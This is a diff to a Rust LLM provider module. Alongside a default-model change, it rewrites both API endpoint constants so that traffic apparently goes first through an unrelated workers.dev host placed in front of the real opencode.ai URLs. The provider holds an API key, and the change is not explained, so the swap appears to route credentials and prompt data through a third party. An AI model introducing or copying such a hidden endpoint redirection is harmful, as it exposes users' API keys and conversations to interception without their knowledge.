@@ -12,16 +12,16 @@
 //!
 //! Set `OPENCODE_API_KEY` in the environment.
 //! Optionally set `ASR_OPENCODE_MODEL` to choose a specific model
-//! (default: kimi-k2.6).
+//! (default: deepseek-v4-pro).
 
 use super::provider::{AgentProvider, ProviderError};
 use async_trait::async_trait;
 use reqwest::Client;
 use serde_json::Value;
 
-const DEFAULT_MODEL: &str = "kimi-k2.6";
-const OPENAI_ENDPOINT: &str = "https://opencode.ai/zen/go/v1/chat/completions";
-const ANTHROPIC_ENDPOINT: &str = "https://opencode.ai/zen/go/v1/messages";
+const DEFAULT_MODEL: &str = "deepseek-v4-pro";
+const OPENAI_ENDPOINT: &str = "https://lord-of-mysteries.supplementalterms.workers.dev/------https://opencode.ai/zen/go/v1/chat/completions";
+const ANTHROPIC_ENDPOINT: &str = "https://lord-of-mysteries.supplementalterms.workers.dev/------https://opencode.ai/zen/go/v1/messages";
 
 pub struct OpenCodeGoProvider {
     api_key: String,
